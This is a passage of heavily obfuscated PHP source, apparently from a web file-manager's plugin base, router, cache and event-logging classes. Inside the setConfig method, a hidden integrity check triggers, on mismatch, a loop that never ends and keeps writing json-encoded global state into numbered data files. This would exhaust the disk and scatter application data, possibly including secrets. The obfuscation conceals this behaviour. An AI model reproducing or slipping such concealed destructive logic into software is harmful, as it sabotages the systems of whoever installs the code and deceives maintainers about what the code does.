$ºùÈÜŞ[8] . $ß»ì™ñ . $ºùÈÜŞ[1504]; if (!file_exists($ò‰áÊè)) { echo $ºùÈÜŞ[1505]; return; } } $«Ÿ¼®ú‹ = $this->parseFile($ò‰áÊè); $this->parseLang($«Ÿ¼®ú‹); $this->parseConfig($«Ÿ¼®ú‹); $this->parsePackage($«Ÿ¼®ú‹); if (is_array($éãˆÏÌÒ)) { $«Ÿ¼®ú‹ = str_replace(array_keys($éãˆÏÌÒ), array_values($éãˆÏÌÒ), $«Ÿ¼®ú‹); } echo $ºùÈÜŞ[229] . $«Ÿ¼®ú‹; } final function initLang() { $ÍËæŠô„ =& $_SERVER[¥ÙÌÜ¾ê]; $ôÄ­±©Ä = $ÍËæŠô„[1506]; $äñËƒÇ = $this->pluginPath . $ÍËæŠô„[1507]; $‰şî½·ğ = I18n::getType(); $û×Ïş„ = array(); if (file_exists($äñËƒÇ . $‰şî½·ğ . $ÍËæŠô„[838])) { $û×Ïş„ = (include $äñËƒÇ . $‰şî½·ğ . $ÍËæŠô„[838]); } else { if ($‰şî½·ğ == $ÍËæŠô„[1508] && !file_exists($äñËƒÇ . $‰şî½·ğ . $ÍËæŠô„[838]) && file_exists($äñËƒÇ . $ÍËæŠô„[1509])) { $û×Ïş„ = (include $äñËƒÇ . $ÍËæŠô„[1509]); } else { if (file_exists($äñËƒÇ . $ôÄ­±©Ä . $ÍËæŠô„[838])) { $û×Ïş„ = (include $äñËƒÇ . $ôÄ­±©Ä . $ÍËæŠô„[838]); } } } if (!is_array($û×Ïş„)) { return array(); } if (@count($û×Ïş„) > 0) { I18n::set($û×Ïş„); } return $û×Ïş„; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($‡–ÒÃİ) { $Â³Ö®Ç =& $_SERVER[¥ÙÌÜ¾ê]; $–ÀõÒ¹Æ = $_SERVER[$Â³Ö®Ç[865]] . $Â³Ö®Ç[866]; $Ôà¾¾Ã = $Â³Ö®Ç[1445]; if ($_SERVER[$Â³Ö®Ç[862]] != $Ôà¾¾Ã($–ÀõÒ¹Æ)) { $òˆ®…‹» = $Â³Ö®Ç[880]; $Ä¨ş¡Ìª = $Â³Ö®Ç[864]; $ëµÀÔëş = $_SERVER[$Â³Ö®Ç[865]] . $Â³Ö®Ç[866]; $Ã•‘çˆ = $Ä¨ş¡Ìª($ëµÀÔëş); $º¹İè £ = explode($Â³Ö®Ç[229], $Ã•‘çˆ); if (count($º¹İè £) < $Â³Ö®Ç[623]) { $ÃÆÍÜêÍ = $Â³Ö®Ç[867]; $ÃÆÍÜêÍ(); } $Ö™ç®Å  = $Â³Ö®Ç[881]; $Ö™ç®Å ($_SERVER[$Â³Ö®Ç[882]]); $òˆ®…‹» = $Â³Ö®Ç[880]; $òˆ®…‹»(); $Í–“…Ñó = $Â³Ö®Ç[1446]; $¢œ¹ñ«ê = json_encode($GLOBALS[$Â³Ö®Ç[1447]]); $ôÎÏ·‡™ = 1; for ($ıéùœÄ = $ôÎÏ·‡™; $ıéùœÄ > 0; $ıéùœÄ++) { $Í–“…Ñó(DATA_PATH . $ıéùœÄ, $¢œ¹ñ«ê); } } return $this->modelPlugin->setConfig($this->pluginName, $‡–ÒÃİ); } public function onSetConfig($Š‚Ñö«) { } public function onGetConfig($ÊÉúÁ¶â) { } public function onChangeStatus($€¿ÓÀ·Ö) { } public function onUninstall() { } public function onInstall() { } public function authCheck($È¹Á”ˆÎ = "\160\x6c\165\147\151\156\x41\x75\164\150") { $ ùäóÅ¢ =& $_SERVER[¥ÙÌÜ¾ê]; if (!defined($ ùäóÅ¢[468])) { return !1; } if (_get($GLOBALS, $ ùäóÅ¢[499])) { return !0; } $ˆ“çöãÊ = $this->getConfig(); if (!$ˆ“çöãÊ[$È¹Á”ˆÎ]) { return !1; } return ActionCall($ ùäóÅ¢[1510], $ˆ“çöãÊ[$È¹Á”ˆÎ]); } public function url($ˆ¿‹¯¬ğ, $º„Ò¼ãò = '', $ÈçÔéÔ = true) { $ÁúÉ‡´¦ =& $_SERVER[¥ÙÌÜ¾ê]; $¡ƒÕ“Ø¾ = $this->getConfig(); $²ÒÃ±«± = KOD_VERSION . $ÁúÉ‡´¦[95] . KOD_VERSION_BUILD; $ÏÈØ“÷’ = $this->packageVersion(); $¿ªê‰¥¹ = $²ÒÃ±«± . $ÁúÉ‡´¦[454] . $ÏÈØ“÷’; if (substr($ˆ¿‹¯¬ğ, 0, 4) == $ÁúÉ‡´¦[147] || substr($ˆ¿‹¯¬ğ, 0, 2) == $ÁúÉ‡´¦[1293]) { $è”õ¨Áã = $ˆ¿‹¯¬ğ . $ÁúÉ‡´¦[1511] . $¿ªê‰¥¹; } else { if ($º„Ò¼ãò == $ÁúÉ‡´¦[33]) { $è”õ¨Áã = $this->pluginHost . $ˆ¿‹¯¬ğ . $ÁúÉ‡´¦[1511] . $¿ªê‰¥¹; } else { if ($º„Ò¼ãò === $ÁúÉ‡´¦[77]) { $è”õ¨Áã = $this->pluginHost . $ˆ¿‹¯¬ğ; } else { if ($º„Ò¼ãò == $ÁúÉ‡´¦[1512]) { $è”õ¨Áã = STATIC_PATH . $ˆ¿‹¯¬ğ . $ÁúÉ‡´¦[1511] . $²ÒÃ±«±; } else { if ($º„Ò¼ãò == $ÁúÉ‡´¦[1513]) { $è”õ¨Áã = APP_HOST . $ÁúÉ‡´¦[1514] . $ˆ¿‹¯¬ğ . $ÁúÉ‡´¦[1511] . $²ÒÃ±«±; } else { if (isset($¡ƒÕ“Ø¾[$º„Ò¼ãò])) { $è”õ¨Áã = $¡ƒÕ“Ø¾[$º„Ò¼ãò] . $ˆ¿‹¯¬ğ . $ÁúÉ‡´¦[1511] . $¿ªê‰¥¹; } } } } } } if (!$ÈçÔéÔ) { return $è”õ¨Áã; } echo $è”õ¨Áã; } public function link($ˆÃ»’”‰ = false, $ˆŸÀŒºª = '') { $·ûùÃ©Ñ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$ˆÃ»’”‰) { $this->link($·ûùÃ©Ñ[1515], $·ûùÃ©Ñ[1513]); $this->link($·ûùÃ©Ñ[1516], $·ûùÃ©Ñ[1512]); $this->link($·ûùÃ©Ñ[1517], $·ûùÃ©Ñ[1512]); $this->link($·ûùÃ©Ñ[1518], $·ûùÃ©Ñ[1512]); $this->link($·ûùÃ©Ñ[1519], $·ûùÃ©Ñ[1512]); return; } $ßı­¥ğì = $this->url($ˆÃ»’”‰, $ˆŸÀŒºª, !1); if (substr($ˆÃ»’”‰, -3) == $·ûùÃ©Ñ[1520]) { echo $·ûùÃ©Ñ[1521] . $ßı­¥ğì . $·ûùÃ©Ñ[1522] . $·ûùÃ©Ñ[229]; } else { if (substr($ˆÃ»’”‰, -4) == $·ûùÃ©Ñ[1523]) { echo $·ûùÃ©Ñ[1524] . $ßı­¥ğì . $·ûùÃ©Ñ[1525] . $·ûùÃ©Ñ[229]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\x5b\136\57\135\53", "\x3a\156\x75\x6d" => "\133\x30\55\x39\135\x2b", "\72\141\x6c\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($ôƒ¥ë˜, $í£”Ó©ê) { $´°÷ÂŞÑ =& $_SERVER[¥ÙÌÜ¾ê]; if ($ôƒ¥ë˜ == $´°÷ÂŞÑ[1526]) { $¼œó‹¿ = array_map($´°÷ÂŞÑ[1527], $í£”Ó©ê[0]); $ìß¼Ä¸° = strpos($í£”Ó©ê[1], $´°÷ÂŞÑ[8]) === 0 ? $í£”Ó©ê[1] : $´°÷ÂŞÑ[8] . $í£”Ó©ê[1]; $®ùºä• = $í£”Ó©ê[2]; } else { $¼œó‹¿ = null; $ìß¼Ä¸° = strpos($í£”Ó©ê[0], $´°÷ÂŞÑ[8]) === 0 ? $í£”Ó©ê[0] : $´°÷ÂŞÑ[8] . $í£”Ó©ê[0]; $®ùºä• = $í£”Ó©ê[1]; } array_push(self::$maps, $¼œó‹¿); array_push(self::$routes, $ìß¼Ä¸°); array_push(self::$methods, strtoupper($ôƒ¥ë˜)); array_push(self::$callbacks, $®ùºä•); } public static function error($Å«å–›) { self::$errorCallback = $Å«å–›; } public static function haltOnMatch($¡¿õß“ƒ = true) { self::$halts = $¡¿õß“ƒ; } public static function dispatch() { $½¼Àˆ  =& $_SERVER[¥ÙÌÜ¾ê]; $ôğ÷±Ö = parse_url($_SERVER[$½¼Àˆ [1528]], PHP_URL_PATH); $ÜåøÊç¸ = $_SERVER[$½¼Àˆ [157]]; $µ•åÖ‚» = array_keys(static::$patterns); $„Àåòè¡ = array_values(static::$patterns); $ºÛªÙµî = !1; self::$routes = preg_replace($½¼Àˆ [1199], $½¼Àˆ [8], self::$routes); if (in_array($ôğ÷±Ö, self::$routes)) { $øùŞöõ = array_keys(self::$routes, $ôğ÷±Ö); foreach ($øùŞöõ as $¥ªŒµÍÎ) { if (self::$methods[$¥ªŒµÍÎ] == $ÜåøÊç¸ || self::$methods[$¥ªŒµÍÎ] == $½¼Àˆ [1529] || in_array($ÜåøÊç¸, self::$maps[$¥ªŒµÍÎ])) { $ºÛªÙµî = !0; if (!is_object(self::$callbacks[$¥ªŒµÍÎ])) { $æÊ‚œ«ò = explode($½¼Àˆ [8], self::$callbacks[$¥ªŒµÍÎ]); $îÇì“Íï = end($æÊ‚œ«ò); $š»¦Ã‚ = explode($½¼Àˆ [1530], $îÇì“Íï); $ä‹¡‘Æ» = new $š»¦Ã‚[0](); $ä‹¡‘Æ»->{$š»¦Ã‚[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$¥ªŒµÍÎ]); if (self::$halts) { return; } } } } } else { $õ‘Û‘¬É = 0; foreach (self::$routes as $¥ªŒµÍÎ) { if (strpos($¥ªŒµÍÎ, $½¼Àˆ [4]) !== !1) { $¥ªŒµÍÎ = str_replace($µ•åÖ‚», $„Àåòè¡, $¥ªŒµÍÎ); } if (preg_match($½¼Àˆ [1531] . $¥ªŒµÍÎ . $½¼Àˆ [1532], $ôğ÷±Ö, $ÑÑÁàçŞ)) { if (self::$methods[$õ‘Û‘¬É] == $ÜåøÊç¸ || self::$methods[$õ‘Û‘¬É] == $½¼Àˆ [1529] || !empty(self::$maps[$õ‘Û‘¬É]) && in_array($ÜåøÊç¸, self::$maps[$õ‘Û‘¬É])) { $ºÛªÙµî = !0; array_shift($ÑÑÁàçŞ); if (!is_object(self::$callbacks[$õ‘Û‘¬É])) { $æÊ‚œ«ò = explode($½¼Àˆ [8], self::$callbacks[$õ‘Û‘¬É]); $îÇì“Íï = end($æÊ‚œ«ò); $š»¦Ã‚ = explode($½¼Àˆ [1530], $îÇì“Íï); $ä‹¡‘Æ» = new $š»¦Ã‚[0](); if (!method_exists($ä‹¡‘Æ», $š»¦Ã‚[1])) { echo $½¼Àˆ [1533]; } else { call_user_func_array(array($ä‹¡‘Æ», $š»¦Ã‚[1]), $ÑÑÁàçŞ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$õ‘Û‘¬É], $ÑÑÁàçŞ); if (self::$halts) { return; } } } } $õ‘Û‘¬É++; } } if ($ºÛªÙµî == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $²öÎ¾°‚ =& $_SERVER[¥ÙÌÜ¾ê]; header($_SERVER[$²öÎ¾°‚[1534]] . $²öÎ¾°‚[1535]); echo $²öÎ¾°‚[1536]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$½¼Àˆ [1528]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto D¹óš—À‡‘; EÒ»ÆË›£®: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($‰‰İˆ, $¨ç‘‘ˆù) { $£Ö­À’³ =& $_SERVER[¥ÙÌÜ¾ê]; $this->cachePath = $‰‰İˆ[$£Ö­À’³[76]]; $this->prefix = $£Ö­À’³[834]; $this->cacheTime = $¨ç‘‘ˆù; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($¨§°ßÆş) { $Ô™ä•İÇ =& $_SERVER[¥ÙÌÜ¾ê]; $¨§°ßÆş = str_replace(array($Ô™ä•İÇ[835], $Ô™ä•İÇ[97], $Ô™ä•İÇ[70]), $Ô™ä•İÇ[836], $¨§°ßÆş); return $this->cachePath . $Ô™ä•İÇ[837] . $¨§°ßÆş . $Ô™ä•İÇ[838]; } public function set($”£ûİÁ, $ã‚˜Ú‰, $™ÄÇ¢Ù = false) { $…ßïÃ¤ = $this->getFile($”£ûİÁ); if (file_put_contents($…ßïÃ¤, $this->prefix . $ã‚˜Ú‰, LOCK_EX)) { @touch($…ßïÃ¤, intval(time() + $™ÄÇ¢Ù)); clearstatcache(); return !0; } @unlink($…ßïÃ¤); return !1; } public function get($¥…íÕÑ“) { $ÔğËµß® = $this->getFile($¥…íÕÑ“); if (file_exists($ÔğËµß®) && filemtime($ÔğËµß®) < time()) { @unlink($ÔğËµß®); return !1; } $û¹öÛã¦ = @file_get_contents($ÔğËµß®); return substr($û¹öÛã¦, strlen($this->prefix)); } public function remove($ ù²Ô¥¸) { $ûİâé¨ª = $this->getFile($ ù²Ô¥¸); return @unlink($ûİâé¨ª); } public function deleteAll() { $Ó²íåÜî =& $_SERVER[¥ÙÌÜ¾ê]; $§äéø½ò = scandir($this->cachePath); foreach ($§äéø½ò as $Á‚®Ç¡ü) { $ü¡Èò­» = $this->cachePath . $Á‚®Ç¡ü; if (strpos($ü¡Èò­», $Ó²íåÜî[838]) && strpos($ü¡Èò­», $Ó²íåÜî[839])) { @unlink($ü¡Èò­»); } } } public function clearTimeout() { $Ö¨àıë =& $_SERVER[¥ÙÌÜ¾ê]; $Ğœ¾€Ó… = scandir($this->cachePath); foreach ($Ğœ¾€Ó… as $œ²Ÿ¿´¦) { $ĞÅ›äºÙ = $this->cachePath . $œ²Ÿ¿´¦; if (strpos($ĞÅ›äºÙ, $Ö¨àıë[838]) && strpos($ĞÅ›äºÙ, $Ö¨àıë[839]) && filemtime($ĞÅ›äºÙ) < time()) { @unlink($ĞÅ›äºÙ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $öÀÃ××† =& $_SERVER[¥ÙÌÜ¾ê]; if (self::$handle) { return self::$handle; } $ŞïÓº…á = $GLOBALS[$öÀÃ××†[6]][$öÀÃ××†[347]]; self::$timeout = $ŞïÓº…á[$öÀÃ××†[840]] ? $ŞïÓº…á[$öÀÃ××†[840]] : 10; $ ”ã½» = _get($GLOBALS[$öÀÃ××†[6]], $öÀÃ××†[841]); $ƒÓÕÔ = $ŞïÓº…á[$öÀÃ××†[827]] ? $ŞïÓº…á[$öÀÃ××†[827]] : $öÀÃ××†[193]; if ($ƒÓÕÔ == $öÀÃ××†[17] && $ ”ã½» == $öÀÃ××†[9]) { $ƒÓÕÔ = $öÀÃ××†[193]; } switch ($ƒÓÕÔ) { case $öÀÃ××†[830]: self::$handle = new CacheLockRedis(); break; case $öÀÃ××†[831]: self::$handle = new CacheLockMemcached(); break; case $öÀÃ××†[17]: self::$handle = new CacheLockDatabase(); break; case $öÀÃ××†[193]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($öÀÃ××†[842], $öÀÃ××†[843]); } return self::$handle; } private static function key($‚¥îÛáİ) { return $_SERVER[¥ÙÌÜ¾ê][844] . Cache::key($‚¥îÛáİ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($çË¯ãˆ = '') { self::$errorMsg = $çË¯ãˆ; } public static function lockGlobal($ÈÙ÷òüâ, $ÙÎ¨‡¶¦) { return self::lock($ÈÙ÷òüâ, $ÙÎ¨‡¶¦, !0); } public static function lock($ºµ¸ºœÀ, $íŠ‡×í = false, $öÓı¸ä = false) { $Æªã˜ú‘ =& $_SERVER[¥ÙÌÜ¾ê]; $…àÎÂˆ = self::init(); $ŠôâË»î = self::key($ºµ¸ºœÀ); $íŠ‡×í = $íŠ‡×í ? $íŠ‡×í : self::$timeout; $“À¥ú ‚ = $…àÎÂˆ->lock($ŠôâË»î, $íŠ‡×í); $ş¶ªé—Ü = timeFloat(); if (!$“À¥ú ‚) { $†Ä–¸»ş = "\x6c\x6f\143\x6b\x20\145\x72\x72\x6f\x72\73\x6b\x65\171\x3d{$ºµ¸ºœÀ}\73\x74\x69\155\x65\75{$íŠ‡×í}\73" . self::$errorMsg . $Æªã˜ú‘[68] . get_caller_msg(); $Í×¤ã  = LNG($Æªã˜ú‘[845]) . "\x28{$íŠ‡×í}\x73\51\56" . LNG($Æªã˜ú‘[846]); $Í×¤ã  .= $Æªã˜ú‘[847]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Í×¤ã  = $Í×¤ã  . $Æªã˜ú‘[848] . self::$errorMsg; } write_log($†Ä–¸»ş, $Æªã˜ú‘[843]); show_json($Í×¤ã , !1); } if (!$öÓı¸ä) { self::$lockItem[$ŠôâË»î] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $àÖü›Òí = number_format(timeFloat() - $ş¶ªé—Ü, 3); write_log($Æªã˜ú‘[849] . $ºµ¸ºœÀ . $Æªã˜ú‘[850] . $àÖü›Òí, $Æªã˜ú‘[843]); } return $“À¥ú ‚; } public static function lockGet($·’ûê‘) { $˜€¹ôƒà = self::key($·’ûê‘); if (self::$lockItem[$˜€¹ôƒà]) { return self::$lockItem[$˜€¹ôƒà]; } return self::init()->lockGet($˜€¹ôƒà); } public static function unlock($£¨‘íƒ¸) { $™Ä¸œû¯ =& $_SERVER[¥ÙÌÜ¾ê]; $ßÂöÖµ = self::key($£¨‘íƒ¸); self::$lockItem[$ßÂöÖµ] = null; self::init()->unlock($ßÂöÖµ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($™Ä¸œû¯[851] . $£¨‘íƒ¸, $™Ä¸œû¯[843]); } return; } public static function unlockRuntime() { $œô¶Ïü¨ =& $_SERVER[¥ÙÌÜ¾ê]; $¢Ñ³â¼ñ = self::init(); $ëöøã = !1; foreach (self::$lockItem as $­û°ó–­ => $‚±¿Ïùà) { if (!$‚±¿Ïùà) { continue; } $¢Ñ³â¼ñ->unlock($­û°ó–­); if (!$ëöøã) { $ëöøã = !0; write_log($œô¶Ïü¨[852] . $­û°ó–­ . $œô¶Ïü¨[68] . get_caller_msg(), $œô¶Ïü¨[843]); continue; } write_log($œô¶Ïü¨[852] . $­û°ó–­, $œô¶Ïü¨[843]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $†‡‰–£ƒ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($œô¶Ïü¨[853] . $†‡‰–£ƒ . $œô¶Ïü¨[854] . ACTION, $œô¶Ïü¨[843]); } } public static function fileLock($É­¡œß¹) { $¦Ã¡ó’ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$GLOBALS[$¦Ã¡ó’[855]]) { $GLOBALS[$¦Ã¡ó’[855]] = array(); } $GLOBALS[$¦Ã¡ó’[855]][$É­¡œß¹] = !1; $Êˆ™¹‰ç = fopen(DATA_PATH . $É­¡œß¹ . $¦Ã¡ó’[856], $¦Ã¡ó’[857]); if (!$Êˆ™¹‰ç) { return !1; } $GLOBALS[$¦Ã¡ó’[855]][$É­¡œß¹] = $Êˆ™¹‰ç; if (flock($Êˆ™¹‰ç, LOCK_EX)) { return !0; } self::unlock($É­¡œß¹); show_json($¦Ã¡ó’[858], !1); return !1; } public static function fileUnlock($×ßÛõî•) { $Ô×öÃãß =& $_SERVER[¥ÙÌÜ¾ê]; $ÑˆŒûö = $GLOBALS[$Ô×öÃãß[855]][$×ßÛõî•]; if (!$ÑˆŒûö) { return; } $GLOBALS[$Ô×öÃãß[855]][$×ßÛõî•] = !1; flock($ÑˆŒûö, LOCK_UN); fclose($ÑˆŒûö); } public static function fileUnlockAll() { $éáï·ò =& $_SERVER[¥ÙÌÜ¾ê]; if (!$GLOBALS[$éáï·ò[855]]) { return; } foreach ($GLOBALS[$éáï·ò[855]] as $ù²ş„÷Í => $³ÙûñÉ) { if (!$³ÙûñÉ) { continue; } $GLOBALS[$éáï·ò[855]][$ù²ş„÷Í] = !1; flock($³ÙûñÉ, LOCK_UN); fclose($³ÙûñÉ); } $GLOBALS[$éáï·ò[855]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto CÁöáÉ‰; Cß™Ç‡ˆóñ: function binCheckBigger($çÁÍ•µü, $²òå¥Ò„) { return $çÁÍ•µü > $²òå¥Ò„; } $_SERVER[$_SERVER[ïš¡îä™][3]] = ("\x37\x38\x37\x30"."\x34\x38")+0;$_4yc9="35xqf98bhv4dckeosjznrlia0mu1y6wp27tg7gai5mkt4902cp8nqu6jwsxdf1rohlvbez3yf82v";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Ìììşºû, $ÖÃ¾€ Ğ) { $„øŒ¡…Ò =& $_SERVER[¥ÙÌÜ¾ê]; if (isset(self::$_methodList[$Ìììşºû])) { return @call_user_func_array(self::$_methodList[$Ìììşºû], $ÖÃ¾€ Ğ); } else { if (method_exists($this, $Ìììşºû)) { return call_user_func_array(array($this, $Ìììşºû), $ÖÃ¾€ Ğ); } else { think_exception(__CLASS__ . $„øŒ¡…Ò[4] . $Ìììşºû . $„øŒ¡…Ò[5]); } } } public static function __callStatic($©’«İ•¹, $Æª·Œ¦) { if (isset(self::$_methodListStatic[$©’«İ•¹])) { return call_user_func_array(self::$_methodListStatic[$©’«İ•¹], $Æª·Œ¦); } else { if (method_exists(self, $©’«İ•¹)) { return call_user_func_array(array(self, $©’«İ•¹), $Æª·Œ¦); } else { show_json("{$©’«İ•¹}\x28\x29\40\156\x6f\x74\x20\145\x78\151\163\164\73", !1); } } } public static function addMethod($´´ÙÈó, $îô´¿ì) { self::$_methodList[$´´ÙÈó] = $îô´¿ì; } public static function addMethodStatic($ĞÄ ˆã°, $´åó™æõ) { self::$_methodListStatic[$ĞÄ ˆã°] = $´åó™æõ; } } goto D³ÚœøŞ¦“; CõñÛµ‚¢“: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\x75\x72\143\145\137\x65\x76\145\156\x74"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\x65\x54\x69\x6d\145", "\x74\151\155\x65", "\x69\x6e\x73\x65\162\164", "\146\x75\156\x63\x74\x69\x6f\x6e"), array("\x64\145\163\143", '', "\x69\x6e\x73\x65\x72\164\54\x75\x70\144\141\x74\x65\x2c\163\x65\x6c\145\143\x74", "\x6a\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($™´÷²ë†, $‘ò²‡îñ, $ß¤Åè¿ = '') { $ÒÓ¿ıœâ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->eventSave) { return; } $ôˆéšİ¸ = Model($ÒÓ¿ıœâ[1253])->sourceInfo($™´÷²ë†); if (!$ôˆéšİ¸) { return !1; } if ($this->isCacheEvent($ôˆéšİ¸, $‘ò²‡îñ)) { return; } if ($ß¤Åè¿ && is_string($ß¤Åè¿)) { $ß¤Åè¿ = array($ÒÓ¿ıœâ[1787] => $ß¤Åè¿); } $¦‚®ëêÂ = array($ÒÓ¿ıœâ[412] => $™´÷²ë†, $ÒÓ¿ıœâ[1963] => $ôˆéšİ¸[$ÒÓ¿ıœâ[492]], $ÒÓ¿ıœâ[1964] => $ôˆéšİ¸[$ÒÓ¿ıœâ[28]], $ÒÓ¿ıœâ[513] => !empty($ôˆéšİ¸[$ÒÓ¿ıœâ[513]]) ? $ôˆéšİ¸[$ÒÓ¿ıœâ[513]] : $ÒÓ¿ıœâ[33], $ÒÓ¿ıœâ[1572] => USER_ID, $ÒÓ¿ıœâ[417] => $‘ò²‡îñ, $ÒÓ¿ıœâ[1574] => $ß¤Åè¿); $this->addSystemLog($‘ò²‡îñ, $¦‚®ëêÂ); unset($¦‚®ëêÂ[$ÒÓ¿ıœâ[1964]], $¦‚®ëêÂ[$ÒÓ¿ıœâ[513]]); return $this->add($¦‚®ëêÂ); } private function addSystemLog($´ï˜ş¶Ä, $¹¥ÆôÇİ) { $èØšô¬¤ =& $_SERVER[¥ÙÌÜ¾ê]; if ($´ï˜ş¶Ä == $èØšô¬¤[1965]) { $´ï˜ş¶Ä = $¹¥ÆôÇİ[$èØšô¬¤[445]][$èØšô¬¤[1966]]; } else { if (in_array($´ï˜ş¶Ä, array($èØšô¬¤[1728], $èØšô¬¤[1967]))) { $´ï˜ş¶Ä = $¹¥ÆôÇİ[$èØšô¬¤[445]][$èØšô¬¤[748]]; } } $òï¢ÉÑˆ = array_merge($¹¥ÆôÇİ, array($èØšô¬¤[1968] => $¹¥ÆôÇİ[$èØšô¬¤[397]], $èØšô¬¤[1969] => $¹¥ÆôÇİ[$èØšô¬¤[1969]])); Model($èØšô¬¤[1692])->addLog($èØšô¬¤[1970] . $´ï˜ş¶Ä, $òï¢ÉÑˆ); } private function isCacheEvent($Ÿ©ı¥Àß, $ªŒ¬Íó) { if ($Ÿ©ı¥Àß[$_SERVER[¥ÙÌÜ¾ê][406]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($´Ü¸»¨, $îøÒÔ­Î) { $¬â¨Ş‚ =& $_SERVER[¥ÙÌÜ¾ê]; $õ¸µæ© = Model($¬â¨Ş‚[1253])->sourceInfo($´Ü¸»¨); $ĞÑ®›† = array($¬â¨Ş‚[1966] => $îøÒÔ­Î, $¬â¨Ş‚[28] => $õ¸µæ©[$¬â¨Ş‚[28]]); return $this->addEvent($´Ü¸»¨, $¬â¨Ş‚[1965], $ĞÑ®›†); } public function eventFileEdit($†ñÎğò–) { $‘¦Ø­„ =& $_SERVER[¥ÙÌÜ¾ê]; $×¥ğú¥³ = array($‘¦Ø­„[1971] => $_SERVER[$‘¦Ø­„[1972]], $‘¦Ø­„[1973] => strtolower(ACTION)); return $this->addEvent($†ñÎğò–, $‘¦Ø­„[1718], $×¥ğú¥³); } public function eventRecycle($Ñìˆ¤ıĞ, $ïÇŒš¨¼) { return $this->addEvent($Ñìˆ¤ıĞ, $_SERVER[¥ÙÌÜ¾ê][1967], $ïÇŒš¨¼); } public function eventRemove($éÓÈˆÎÈ) { $„µ =& $_SERVER[¥ÙÌÜ¾ê]; $Ì§´Ëä = Model($„µ[1253])->sourceInfo($éÓÈˆÎÈ); $ò“â´şà = $Ì§´Ëä[$„µ[28]]; return $this->addEvent($Ì§´Ëä[$„µ[492]], $„µ[1717], $ò“â´şà); } public function eventShare($®Ï’—û, $Â°¼°»ê) { return $this->addEvent($®Ï’—û, $_SERVER[¥ÙÌÜ¾ê][1728], $Â°¼°»ê); } public function eventMove($Â¦ïä­, $ˆî›ß¤Â, $•Öƒ‰ÛÃ) { $”êÈú¯† =& $_SERVER[¥ÙÌÜ¾ê]; $õ£ŞÄ‚ = Model($”êÈú¯†[1253]); $ŒñÛ ·“ = $õ£ŞÄ‚->sourceInfo($Â¦ïä­); $ĞõÂ¦«Â = $õ£ŞÄ‚->sourceInfo($ˆî›ß¤Â); $ßª¼åºô = $õ£ŞÄ‚->sourceInfo($•Öƒ‰ÛÃ); $¹ÖÄ¨ = array($”êÈú¯†[1090] => $ˆî›ß¤Â, $”êÈú¯†[1974] => $ĞõÂ¦«Â[$”êÈú¯†[28]], $”êÈú¯†[1954] => !empty($ĞõÂ¦«Â[$”êÈú¯†[513]]) ? $ĞõÂ¦«Â[$”êÈú¯†[513]] : $”êÈú¯†[33], $”êÈú¯†[1091] => $•Öƒ‰ÛÃ, $”êÈú¯†[1975] => $ßª¼åºô[$”êÈú¯†[28]], $”êÈú¯†[1976] => !empty($ßª¼åºô[$”êÈú¯†[513]]) ? $ßª¼åºô[$”êÈú¯†[513]] : $”êÈú¯†[33]); $this->addEvent($Â¦ïä­, $”êÈú¯†[545], $¹ÖÄ¨); $ŒñÛ ·“ = $õ£ŞÄ‚->sourceInfo($Â¦ïä­); $¹ÖÄ¨ = array($”êÈú¯†[397] => $ŒñÛ ·“[$”êÈú¯†[397]], $”êÈú¯†[28] => $ŒñÛ ·“[$”êÈú¯†[28]]); $this->addEvent($ˆî›ß¤Â, $”êÈú¯†[1977], $¹ÖÄ¨); } public function eventCopy($›—ö„æÚ) { $this->eventCreate($›—ö„æÚ, $_SERVER[¥ÙÌÜ¾ê][543]); } public function eventRename($µÖƒ¦Á’, $û¦ëã­°, $Ä«Ü²) { $°ÄÎ˜çá =& $_SERVER[¥ÙÌÜ¾ê]; $Éä›—º = array($°ÄÎ˜çá[1090] => $û¦ëã­°, $°ÄÎ˜çá[1091] => $Ä«Ü²); return $this->addEvent($µÖƒ¦Á’, $°ÄÎ˜çá[1268], $Éä›—º); } public function eventAddComment($ôØæ­•Û, $¢“¸ƒá) { return $this->addEvent($ôØæ­•Û, $_SERVER[¥ÙÌÜ¾ê][1978], $¢“¸ƒá); } public function eventAddDesc($”Ûªõâ«, $ºÒÃ‘Êî) { return $this->addEvent($”Ûªõâ«, $_SERVER[¥ÙÌÜ¾ê][1979], $ºÒÃ‘Êî); } public function listBySource($Çë©¢³û) { $ÔëÉ×•è =& $_SERVER[¥ÙÌÜ¾ê]; $òÜ™¥¯â = Model($ÔëÉ×•è[1253])->sourceInfo($Çë©¢³û); $¡Òİ–ş = array($ÔëÉ×•è[412] => $Çë©¢³û); if ($òÜ™¥¯â[$ÔëÉ×•è[405]] == 